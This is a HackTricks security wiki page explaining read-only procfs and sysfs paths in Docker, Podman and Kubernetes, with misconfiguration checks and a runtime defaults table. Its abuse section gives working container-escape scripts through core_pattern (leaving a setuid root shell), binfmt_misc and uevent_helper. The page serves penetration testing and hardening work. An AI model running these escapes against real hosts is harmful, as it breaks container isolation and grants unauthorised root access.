_body: "# Read-Only System Paths\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\nRead-only system paths are\
  \ a separate protection from masked paths. Instead of hiding a path completely, the runtime exposes it but mounts it read-only.\
  \ This is common for selected procfs and sysfs locations where read access may be acceptable or operationally necessary,\
  \ but writes would be too dangerous.\n\nThe purpose is straightforward: many kernel interfaces become much more dangerous\
  \ when they are writable. A read-only mount does not remove all reconnaissance value, but it prevents a compromised workload\
  \ from modifying the underlying kernel-facing files through that path.\n\n## Operation\n\nRuntimes frequently mark parts\
  \ of the proc/sys view as read-only. Depending on the runtime and host, this may include paths such as:\n\n- `/proc/sys`\n\
  - `/proc/sysrq-trigger`\n- `/proc/irq`\n- `/proc/bus`\n\nThe actual list varies, but the model is the same: allow visibility\
  \ where needed, deny mutation by default.\n\n## Lab\n\nInspect the Docker-declared read-only path list:\n\n```bash\ndocker\
  \ inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'\n```\n\nInspect the mounted proc/sys view from inside the container:\n\
  \n```bash\nmount | grep -E '/proc|/sys'\nfind /proc/sys -maxdepth 2 -writable 2>/dev/null | head\nfind /sys -maxdepth 3\
  \ -writable 2>/dev/null | head\n```\n\n## Security Impact\n\nRead-only system paths narrow a large class of host-impacting\
  \ abuse. Even when an attacker can inspect procfs or sysfs, being unable to write there removes many direct modification\
  \ paths involving kernel tunables, crash handlers, module-loading helpers, or other control interfaces. The exposure is\
  \ not gone, but the transition from information disclosure to host influence becomes harder.\n\n## Misconfigurations\n\n\
  The main mistakes are unmasking or remounting sensitive paths read-write, exposing host proc/sys content directly with writable\
  \ bind mounts, or using privileged modes that effectively bypass the safer runtime defaults. In Kubernetes, `procMount:\
  \ Unmasked` and privileged workloads often travel together with weaker proc protection. Another common operational mistake\
  \ is assuming that because the runtime usually mounts these paths read-only, all workloads are still inheriting that default.\n\
  \n## Abuse\n\nIf the protection is weak, begin by looking for writable proc/sys entries:\n\n```bash\nfind /proc/sys -maxdepth\
  \ 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container\nfind /sys -maxdepth\
  \ 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state\n\
  ```\n\nWhen writable entries are present, high-value follow-up paths include:\n\n```bash\ncat /proc/sys/kernel/core_pattern\
  \ 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash\ncat /proc/sys/kernel/modprobe\
  \ 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities\ncat /proc/sys/fs/binfmt_misc/status\
  \ 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution\ncat\
  \ /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service\
  \ conditions\ncat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access\
  \ can become host code execution\n```\n\nWhat these commands can reveal:\n\n- Writable entries under `/proc/sys` often mean\
  \ the container can modify host kernel behavior rather than merely inspect it.\n- `core_pattern` is especially important\
  \ because a writable host-facing value can be turned into a host code-execution path by crashing a process after setting\
  \ a pipe handler.\n- `modprobe` reveals the helper used by the kernel for module-loading related flows; it is a classic\
  \ high-value target when writable.\n- `binfmt_misc` tells you whether custom interpreter registration is possible. If registration\
  \ is writable, this can become an execution primitive instead of just an information leak.\n- `panic_on_oom` controls a\
  \ host-wide kernel decision and can therefore turn resource exhaustion into host denial of service.\n- `uevent_helper` is\
  \ one of the clearest examples of a writable sysfs helper path producing host-context execution.\n\nInteresting findings\
  \ include writable host-facing proc knobs or sysfs entries that should normally have been read-only. At that point, the\
  \ workload has moved from a constrained container view toward meaningful kernel influence.\n\n### Full Example: `core_pattern`\
  \ Host Escape\n\nIf `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel\
  \ view, it can be abused to execute a payload after a crash:\n\n```bash\n[ -w /proc/sys/kernel/core_pattern ] || exit 1\n\
  overlay=$(mount | sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' | head -n1)\ncat <<'EOF' > /shell.sh\n#!/bin/sh\ncp /bin/sh\
  \ /tmp/rootsh\nchmod u+s /tmp/rootsh\nEOF\nchmod +x /shell.sh\necho \"|$overlay/shell.sh\" > /proc/sys/kernel/core_pattern\n\
  cat <<'EOF' > /tmp/crash.c\nint main(void) {\n  char buf[1];\n  for (int i = 0; i < 100; i++) buf[i] = 1;\n  return 0;\n\
  }\nEOF\ngcc /tmp/crash.c -o /tmp/crash\n/tmp/crash\nls -l /tmp/rootsh\n```\n\nIf the path really reaches the host kernel,\
  \ the payload runs on the host and leaves a setuid shell behind.\n\n### Full Example: `binfmt_misc` Registration\n\nIf `/proc/sys/fs/binfmt_misc/register`\
  \ is writable, a custom interpreter registration can produce code execution when the matching file is executed:\n\n```bash\n\
  mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc\ncat <<'EOF' > /tmp/h\n#!/bin/sh\n\
  id > /tmp/binfmt.out\nEOF\nchmod +x /tmp/h\nprintf ':hack:M::HT::/tmp/h:\\n' > /proc/sys/fs/binfmt_misc/register\nprintf\
  \ 'HT' > /tmp/test.ht\nchmod +x /tmp/test.ht\n/tmp/test.ht\ncat /tmp/binfmt.out\n```\n\nOn a host-facing writable `binfmt_misc`,\
  \ the result is code execution in the kernel-triggered interpreter path.\n\n### Full Example: `uevent_helper`\n\nIf `/sys/kernel/uevent_helper`\
  \ is writable, the kernel may invoke a host-path helper when a matching event is triggered:\n\n```bash\ncat <<'EOF' > /tmp/evil-helper\n\
  #!/bin/sh\nid > /tmp/uevent.out\nEOF\nchmod +x /tmp/evil-helper\noverlay=$(mount | sed -n 's/.*upperdir=\\([^,]*\\).*/\\\
  1/p' | head -n1)\necho \"$overlay/tmp/evil-helper\" > /sys/kernel/uevent_helper\necho change > /sys/class/mem/null/uevent\n\
  cat /tmp/uevent.out\n```\n\nThe reason this is so dangerous is that the helper path is resolved from the host filesystem\
  \ perspective rather than from a safe container-only context.\n\n## Checks\n\nThese checks determine whether procfs/sysfs\
  \ exposure is read-only where expected and whether the workload can still modify sensitive kernel interfaces.\n\n```bash\n\
  docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths\nmount | grep -E '/proc|/sys'\
  \                                      # Actual mount options\nfind /proc/sys -maxdepth 2 -writable 2>/dev/null | head \
  \          # Writable procfs tunables\nfind /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs\
  \ paths\n```\n\nWhat is interesting here:\n\n- A normal hardened workload should expose very few writable proc/sys entries.\n\
  - Writable `/proc/sys` paths are often more important than ordinary read access.\n- If the runtime says a path is read-only\
  \ but it is writable in practice, review mount propagation, bind mounts, and privilege settings carefully.\n\n## Runtime\
  \ Defaults\n\n| Runtime / platform | Default state | Default behavior | Common manual weakening |\n| --- | --- | --- | ---\
  \ |\n| Docker Engine | Enabled by default | Docker defines a default read-only path list for sensitive proc entries | exposing\
  \ host proc/sys mounts, `--privileged` |\n| Podman | Enabled by default | Podman applies default read-only paths unless\
  \ explicitly relaxed | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |\n| Kubernetes | Inherits runtime\
  \ defaults | Uses the underlying runtime read-only path model unless weakened by Pod settings or host mounts | `procMount:\
  \ Unmasked`, privileged workloads, writable host proc/sys mounts |\n| containerd / CRI-O under Kubernetes | Runtime default\
  \ | Usually relies on OCI/runtime defaults | same as Kubernetes row; direct runtime config changes can weaken the behavior\
  \ |\n\nThe key point is that read-only system paths are usually present as a runtime default, but they are easy to undermine\
  \ with privileged modes or host bind mounts.\n{{#include ../../../../banners/hacktricks-training.md}}"
